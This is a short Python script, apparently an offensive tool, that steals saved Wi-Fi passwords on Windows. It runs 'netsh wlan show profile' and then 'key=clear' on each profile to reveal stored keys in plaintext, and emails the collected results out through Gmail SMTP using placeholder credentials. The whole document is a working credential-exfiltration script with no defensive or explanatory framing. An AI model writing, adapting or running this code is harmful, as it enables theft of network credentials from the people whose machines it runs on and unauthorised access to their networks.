import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_profiles = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = "------------------PROFILE------------------\n"

for profile in network_profiles:
    profile_command = "netsh wlan show profile " + profile + " key=clear"
    profile_output = subprocess.check_output(profile_command, shell=True)
    result += profile_output + "\n------------------PROFILE------------------\n"


send_mail('email@gmail.com', 'password', result)
